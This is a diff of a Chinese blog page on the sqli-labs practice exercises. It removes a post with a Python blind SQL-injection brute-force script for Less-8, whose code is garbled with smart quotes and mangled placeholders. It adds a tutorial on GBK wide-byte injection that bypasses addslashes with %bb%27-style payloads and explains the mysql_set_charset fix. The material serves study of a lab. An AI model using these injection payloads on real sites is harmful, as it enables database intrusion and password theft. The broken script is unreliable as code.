@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="less 8, Shelly、夏风">
+    <meta name="keywords" content="宽字节注入（less32 33 34  35 36 37的解法）, Shelly、夏风">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>less 8 | Shelly、夏风</title>
+    <title>宽字节注入（less32 33 34  35 36 37的解法） | Shelly、夏风</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">less 8</h1>
+                    <h1 class="description center-align post-title">宽字节注入（less32 33 34  35 36 37的解法）</h1>
                 </div>
             </div>
         </div>
@@ -444,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    1970-01-01
+                    2022-02-25
                 </div>
                 
 
@@ -465,25 +465,18 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a target="_blank" rel="noopener" href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p>
-<pre><code>    2.Payload=”and substr((select table_name from information_schema.tables 
-    Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表
-
-    3.Payload=”and substr((select column_name from #information_schema.columns 
-    Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列
-
-    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.
-    Format(i,char)        //进行查询密码
-
-
-    url=url+payload           //
-    print(url)
-    r=requests.get(url)
-    if &quot;are&quot; in r.text:
-        flag+=char        //最后将所得出的flag打印出
-        print(flag)
-print(flag)
-</code></pre>
+                <p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’。<br>PHP 自带一些转义特殊字符的函数，如addslashes()，mysql_real_escape_string()，mysql_escape_string()等，这些函数可用来防止 SQL 注入。</p>
+<p>  如id=1’or’1’=’1，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符\，变为1&#39;or&#39;1&#39;=&#39;1，如此在 SQL 查询中是一个普通的字符串，不能进行注入。<br>  而网站在过滤’的时候，通常的思路就是将’转换为&#39;,因此我们在此想办法将’前面添加的\去掉，一般有两种思路：</p>
+<ul>
+<li>%bb吃掉<br>如果程序的默认字符集是GBK等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。<br>若在 PHP 中使用mysql_query(“set names gbk”)将默认字符集设为GBK，而使用addslashes()转义用户输入，这时如果用户输入%bb%27，则addslashes()会在%27前面加上一个%5c字符，即转义字符\。<br>而 MySQL 在使用GBK编码时，会认为两个字符为一个汉字，%bb%5c是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是籠，也就是说%bb%5c%27=籠’，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。%bb并不是唯一一个可以产生宽字节注入的字符，理论上%81-%FE均可。</li>
+</ul>
+<ul>
+<li>过滤&#39;中的<br>构造%bb%5c%5c%27，addslashes()会在两个%5c和%27前都加上\即%5c，变为%bb %5c%5c %5c%5c %5c%27，但宽字符集认为%bb%5c是一个字符即籠，则变为%bb%5c %5c%5c %5c%5c %27即籠\\‘，四个\正好转义为两个\，即’未被转义。这也是 bypass 的一种方法。</li>
+</ul>
+<p>之后less 32 less 33 less 34 less35 less36 less37都会使用这种方式来消除转义字符。</p>
+<p>0x02：宽字符注入的修复<br>先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string函数来过滤用户输入。</p>
+<p>（也就是说，先不进行转义，首先以GBK编码的形式对提交上来的参数进行编码，然后再进行转义，（先编码也意味着反斜杠即5c不会出现，到下一步的转义引号才出现）这就造成了编码过后转义引号的反斜杠即字符5c不会和字符df变成一个宽字符，阻止了df 和 5c 的拼接，于是防宽字符注入成功）<br>————————————————</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105933348"><em>原文链接</em></a></p>
 
                 
             </div>
@@ -510,7 +503,7 @@ print(flag)
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/1970/01/01/less8/">http://example.com/1970/01/01/less8/</a>
+                    <a href="http://example.com/2022/02/25/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">http://example.com/2022/02/25/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -719,13 +712,13 @@ print(flag)
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/1970/01/01/My-New-Post/">
+                <a href="/2022/02/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="My New Post">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="堆叠注入（less38~45）">
                         
-                        <span class="card-title">My New Post</span>
+                        <span class="card-title">堆叠注入（less38~45）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -736,7 +729,7 @@ print(flag)
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>1970-01-01
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-25
                         </span>
                         <span class="publish-author">
                             
@@ -756,13 +749,13 @@ print(flag)
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/1970/01/01/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/">
+                <a href="/2022/02/25/%E5%B0%8F%E6%8F%90%E7%A4%BA/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="利用C++猜数字">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="判断过滤">
                         
-                        <span class="card-title">利用C++猜数字</span>
+                        <span class="card-title">判断过滤</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -773,7 +766,7 @@ print(flag)
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>1970-01-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-25
                             </span>
                         <span class="publish-author">
                             
@@ -782,14 +775,6 @@ print(flag)
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E5%87%BA%E5%A5%87%E7%9A%84%E6%85%A2/">
-                        <span class="chip bg-color">学习进度出奇的慢</span>
-                    </a>
-                    
                 </div>
                 
             </div>
